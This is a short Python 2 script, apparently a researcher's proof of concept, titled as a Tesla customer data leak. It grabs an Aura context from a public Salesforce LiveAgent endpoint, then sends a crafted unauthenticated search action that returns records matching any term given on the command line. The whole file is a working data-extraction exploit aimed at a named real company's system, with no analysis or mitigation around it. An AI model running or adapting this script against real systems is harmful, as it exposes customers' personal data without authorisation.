#Tesla customer data leak via https://tesla.secure.force.com/LiveAgent/aura
#By Ngocdh
#ver 0.1 20190926

import requests
#import urllib
import sys, traceback
import json
import argparse

requests.packages.urllib3.disable_warnings()

#retrieving the aura context
fwuid = ""
appmarkup = ""
try:
    r = requests.get("https://tesla.secure.force.com/LiveAgent/embeddedService/sidebarApp.app?aura.format=JSON&aura.formatAdapter=LIGHTNING_OUT")
    fwuid = json.loads(r.text)["auraConfig"]["context"]["fwuid"]
    appmarkup = json.loads(r.text)["auraConfig"]["context"]["loaded"]['APPLICATION@markup://embeddedService:sidebarApp']
    print "[+] Got Context parameters"
    #print fwuid, appmarkup
    print ""
except:
    print "[-] Hmm got issue retrieving data from tesla.secure.force.com!"
    traceback.print_exc(file=sys.stdout)
    exit()

auracontext = '{"mode":"PROD","fwuid":"{0}","app":"embeddedService:sidebarApp","loaded":{"APPLICATION@markup://embeddedService:sidebarApp":"{1}"},"dn":[],"globals":{"eswConfigDeveloperName":"Inside_Sales"},"uad":false}'.replace("{0}",fwuid).replace("{1}", appmarkup)

p = argparse.ArgumentParser()

p.add_argument('term', help = 'Search term')
args = p.parse_args()
term = vars(args)['term']

#querying users
burp0_url = "https://tesla.secure.force.com/LiveAgent/aura"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0", "Accept": "*/*", "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Connection": "close"}
burp0_data={"message": "{\"actions\":[{\"id\":\"2772;a\",\"descriptor\":\"serviceComponent://ui.search.components.forcesearch.topresultsdataprovider.TopResultsDataProviderController/ACTION$getItems\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"requestedScopeNames\":[],\"term\":\"" + term + "\",\"pageSize\":10,\"enableRowActions\":false,\"context\":{\"disableSpellCorrection\":false,\"disableIntentQuery\":false,\"permsAndPrefs\":{\"OrgPermissions.UnionAppNavSmartScope\":false,\"SearchUi.feedbackComponentEnabled\":false,\"SearchUi.searchUIPilotFeatureEnabled\":false,\"SearchExperience.LeftNavEnhancementEnabled\":true,\"Search.crossObjectsAutoSuggestEnabled\":true,\"Search.maskSearchInfoInLogs\":false,\"SearchUi.orgHasAccessToSearchTermHistory\":false,\"SearchResultsLVM.lvmEnabledForSearchResultsOn\":true,\"SearchUi.searchUIInteractionLoggingEnabled\":false,\"MySearch.userCanHaveMySearchBestResult\":false,\"SearchResultsLVM.lvmEnabledForTopResults\":false,\"MySearch.userCanHaveMySearch\":false},\"queryIds\":[],\"scopeSets\":{\"SMART_SCOPE\":[{\"cacheable\":\"Y\",\"name\":\"FeedItem\",\"fields\":\"Body,CreatedDate\"}]}},\"batchSize\":3,\"batchingTimeout\":2500,\"withSingleSOSL\":true,\"withEntityPrediction\":true,\"withSpellCorrection\":true,\"withIntentQuery\":true}}]}", "aura.context": auracontext, "aura.pageURI": "a", "aura.token": "undefined"}
r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

print "[+] Got results"
result = json.loads(r.text)["actions"][0]["returnValue"]["results"][0]["result"]
print json.dumps(result, sort_keys=True, indent=4)
print ""
